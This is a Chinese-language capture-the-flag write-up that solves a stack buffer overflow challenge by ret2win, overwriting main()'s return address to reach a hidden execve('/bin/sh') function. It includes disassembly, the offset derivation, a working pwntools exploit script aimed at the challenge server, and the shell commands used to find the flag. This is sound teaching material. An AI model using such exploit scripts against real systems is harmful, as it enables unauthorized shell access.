# Writeup：pwn101（Stack Buffer Overflow → ret2win）

> 目標檔案：[pwn101](pwn101)
> 遠端：`ctf.adl.tw:10000`
> 分類：Binary Exploitation / pwn
> 前提假設：**題目只給了 `pwn101` 這一個二進位檔案**，沒有任何 solve script、沒有原始碼，從零開始分析。

---

## 1. 初步偵查（Recon）

拿到一個不知道內容的二進位檔案，第一步永遠是先搞清楚「這是什麼東西」，而不是急著丟進反組譯器。

```bash
file pwn101
```

```
pwn101: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, ... not stripped
```

從這行輸出可以拿到幾個重要情報：

- **ELF 64-bit executable**：Linux 平台的執行檔，之後反組譯要用 `x86-64` 模式。
- **dynamically linked**：有外部的動態函式庫（libc）要在執行時連結，意味著程式裡會有 `gets`、`puts` 這類 libc 函式透過 PLT 呼叫。
- **not stripped**（這是最關鍵的情報）：symbol table（符號表）**沒有被移除**，代表函式名稱還留在檔案裡，可以直接看到每個函式叫什麼名字 —— 這對接下來的分析是巨大的優勢。如果題目故意 strip 掉，難度會高很多（見第 6 節）。

接著檢查有沒有保護機制（canary、NX、PIE、RELRO）：

```bash
checksec pwn101
```

這題的重點結果是：**沒有 stack canary**、**沒有 PIE**（程式本身的位址是固定的，不會隨機化）。這兩點直接決定了可行的攻擊手法——沒有 canary 代表可以直接 overflow 蓋 return address 而不會被偵測；沒有 PIE 代表程式裡所有函式的位址都是寫死的常數，不用想辦法 leak 位址。

## 2. 列出所有函式符號（Symbol Enumeration）

因為檔案 **not stripped**，直接把整個 symbol table 列出來看，掃過一遍找有沒有「不該存在」的函式：

```python
from pwn import ELF
e = ELF('pwn101', checksec=False)
for name, addr in sorted(e.symbols.items(), key=lambda x: x[1]):
    if 0x401000 <= addr < 0x402500 and name:
        print(hex(addr), name)
```

輸出：

```
0x401074 puts / plt.puts
0x401084 execve / plt.execve
0x401094 gets / plt.gets
0x4010a4 setvbuf / plt.setvbuf
0x4011fb sakidaisuki
0x40121f main
```

這份清單裡大部分都是正常、`libc` 本來就有的函式（`puts`、`gets`、`setvbuf`），但有兩個東西特別值得注意：

1. **`execve` 竟然被 import 進來了**。一般程式幾乎不會手動呼叫 `execve`（這是用來執行外部程式/開 shell 的 syscall 包裝函式），正常的 `printf`/`gets` 程式完全用不到它。看到它出現在 import table，等於題目在暗示「這裡藏了可以開 shell 的東西」。
2. **`sakidaisuki`** 這個函式名字完全不像是 `main()` 自然會呼叫到的輔助函式（命名風格也跟其他系統函式格格不入）——這種「正常執行流程中不會被呼叫，卻被編進二進位」的函式，就是典型的 **win function / 後門函式**，是這題刻意留下的提示。

> 如果題目把符號表 strip 掉，就看不到這些名字了。退而求其次的作法是：`strings pwn101` 找 `"/bin/sh"` 之類的可疑字串，或是直接在 `.text` 裡搜尋 `call execve` / `call system` 這類危險呼叫，再往回定位是哪個函式包著它（詳見第 6 節）。

## 3. 反組譯可疑函式，確認它是「win function」

把 `sakidaisuki`（`0x4011fb`）這段反組譯出來看內容：

```python
import capstone
md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
code = e.read(0x4011fb, 0x24)
for ins in md.disasm(code, 0x4011fb):
    print(f'{ins.address:#x}: {ins.mnemonic} {ins.op_str}')
```

```asm
0x4011fb: endbr64
0x4011ff: push rbp
0x401200: mov rbp, rsp
0x401203: mov edx, 0          ; 第三個參數 envp = NULL
0x401208: mov esi, 0          ; 第二個參數 argv = NULL
0x40120d: lea rax, [rip + 0xdf4]   ; 算出 "/bin/sh" 字串的位址
0x401214: mov rdi, rax        ; 第一個參數 = "/bin/sh"
0x401217: call execve
0x40121c: nop
0x40121d: pop rbp
0x40121e: ret
```

對照 x86-64 System V 呼叫慣例（前三個參數依序放在 `rdi, rsi, rdx`），這段程式碼完全等同於 C 語言的：

```c
execve("/bin/sh", NULL, NULL);
```

**確認完畢**：這就是一個現成的「execute shell」函式，只要能讓程式執行流程跳到 `0x4011fb`，就能直接拿到一個 shell，完全不需要自己寫 shellcode。這題的攻擊手法屬於 **ret2win**（return-to-win）。

## 4. 分析漏洞點：`main()` 哪裡能被 overflow

```python
code = e.read(0x40121f, 0x4d)
for ins in md.disasm(code, 0x40121f):
    print(f'{ins.address:#x}: {ins.mnemonic} {ins.op_str}')
```

```asm
0x40121f: endbr64
0x401223: push rbp
0x401224: mov rbp, rsp
0x401227: sub rsp, 0x30        ; buffer 大小 = 0x30 (48) bytes
...
0x401253: lea rax, [rbp - 0x30]  ; rax = buffer 起始位址
0x401257: mov rdi, rax
0x40125f: call gets              ; gets(buf) ← 沒有長度檢查！
0x401264: mov eax, 0
0x401269: leave
0x40126a: ret
```

關鍵就兩點：

1. **`sub rsp, 0x30`**：`main()` 只幫區域變數（這裡就是那個 buffer）保留了 `0x30`（十進位 48）bytes。
2. **`call gets`**：`gets()` 這個 C 標準函式庫函式**完全不檢查輸入長度**，呼叫者輸入多長它就寫多長。這是歷史上惡名昭彰到被從 C11 標準直接移除的函式，只要看到 `gets` 幾乎可以直接斷定有 stack buffer overflow。

### 推算 offset（從 buffer 起點到 return address 的距離）

把 x86-64 的函式呼叫慣例畫成記憶體圖（低位址 → 高位址）：

```
rbp-0x30 ┌─────────────────────┐
         │   buffer（48 bytes）  │ ← gets() 從這裡開始往高位址寫
rbp+0x00 ├─────────────────────┤
         │  saved rbp（8 bytes） │ ← push rbp 存下來的呼叫者 rbp，固定 8 bytes（64-bit 暫存器）
rbp+0x08 ├─────────────────────┤
         │   return address      │ ← main 執行到 ret 時，會跳去這裡繼續執行
         └─────────────────────┘
```

所以：

```
offset = buffer 大小 + saved rbp 大小 = 0x30 + 0x8 = 0x38（56 bytes）
```

這兩個數字 **`0x30` 跟 `0x8`** 都是直接從 `main()` 的組合語言讀出來的事實，不是套公式猜測——`0x30` 來自 `sub rsp, 0x30`，`0x8` 是 64-bit 架構下 一個暫存器固定大小。只要輸入長度超過 56 bytes，第 57 個 byte 開始就會覆寫到 return address。

## 5. 組 Payload、驗證漏洞

**Payload 設計邏輯**：

```
payload = 56 bytes 的任意填充（蓋掉 buffer + saved rbp，內容不重要）
        + 8 bytes 的 0x4011fb（小端序寫入，蓋掉 return address）
```

```python
from pwn import *
context.arch = 'amd64'

p = remote('ctf.adl.tw', 10000)

sakidaisuki = 0x4011fb
payload = b'A' * 0x38 + p64(sakidaisuki)

p.sendline(payload)
p.interactive()
```

**原理**：`gets()` 把這 64 bytes 整串寫進 buffer，前 56 bytes 蓋掉 buffer 和 saved rbp（反正值無所謂），緊接著的 8 bytes 精準落在 return address 的位置，變成 `0x4011fb`。`main()` 執行到 `ret` 指令時，CPU 不會跳回原本的呼叫者，而是跳去 `sakidaisuki()`，執行 `execve("/bin/sh")`，拿到一個 shell。

連線後進入 shell，手動輸入：

```
cat /home/pwn101/flag
```

（flag 檔案位置同樣需要自己找，用 `find / -iname "*flag*" 2>/dev/null` 列出所有可能路徑）

拿到：

```
ADLCTF{c0ngr4t5_y0u_pwn3d_1t!_S4k1_10v35_y0u}
```

## 6. 如果這題的符號表被 strip 掉，流程會怎麼改變？

這題能這麼快解出來，很大程度是因為 `not stripped` 直接洩漏了 `sakidaisuki` 這個名字。如果換成 stripped 版本，第 2 步「列 symbol table」就看不到任何函式名字了，流程要改成：

1. **`checksec` 照跑**：還是要先確認有沒有 canary / NX / PIE，決定攻擊手法方向不變。
2. **找可疑字串**：`strings pwn101 | grep -i sh` 或用 pwntools 掃 `.rodata`，看有沒有 `"/bin/sh"` 這類字串被硬編碼進去。
3. **找危險函式呼叫**：掃整個 `.text` 段的機器碼，找 `call` 指令目標落在 `execve`/`system` 的 PLT 位址上（即使函式沒名字，PLT entry 的位址本身還是能從 `.plt` 結構辨識出來，因為 PLT stub 的格式是固定的）。
4. **反向定位 caller**：找到可疑的 `call execve` 後，往前找出這段指令屬於哪個函式（通常從上一個 `endbr64`/`push rbp` 開始算），確認它的行為跟手上這題的 `sakidaisuki` 一樣。
5. **分析 `main()` 找 buffer overflow 點**：這一步跟本題完全一樣，不受 strip 影響——`gets()` 的 PLT 位址即使沒名字也能從 import table 的結構辨識出來，只要找到 `call` 到該位址的地方，往回看 `sub rsp, N` 就能算出 buffer 大小。
6. 剩下組 payload、驗證的步驟完全一樣。

**結論**：`not stripped` 讓這題的「找後門函式」這一步幾乎變成白送的提示；但就算被 strip，漏洞本質（`gets()` 沒有長度檢查）跟 offset 計算方式（`sub rsp` 的數值 + 固定的 8 bytes saved rbp）完全不受影響，差別只在於要多花工夫靠字串/危險函式呼叫去定位出等價於 `sakidaisuki` 的那段程式碼。

---

## 重點整理

- **漏洞成因**：`main()` 呼叫沒有長度檢查的 `gets()`，寫入一個只有 48 bytes 的 stack buffer，造成 stack buffer overflow；二進位沒有 stack canary，overflow 不會被偵測。
- **Offset 推導**：完全從反組譯結果讀出來——`sub rsp, 0x30`（buffer 48 bytes）+ 固定 8 bytes 的 saved rbp = `0x38`（56）bytes 之後緊接著就是 return address。
- **攻擊手法**：**ret2win**——不用自己寫 shellcode，直接把 return address 蓋成二進位裡現成、正常流程不會呼叫到的 `sakidaisuki()`（內容是 `execve("/bin/sh", NULL, NULL)`），劫持執行流程去執行它。
- **為什麼能這麼快找到後門函式**：binary **not stripped**，symbol table 保留完整函式名稱，直接列出來掃一遍就能發現命名風格突兀、正常流程不會呼叫到的函式；配合 import table 裡出現了「不該出現」的 `execve`，兩個線索互相印證。
- **沒有 solve script 時的完整思路順序**：`file`/`checksec` 初步偵查 → 列 symbol table 找可疑函式（或 strip 情況下找字串/危險呼叫）→ 反組譯確認該函式是 win function → 反組譯 `main()` 找出 overflow 點與 offset → 組 payload 驗證 → 連線拿 shell → 自己找 flag 檔案位置並讀取。
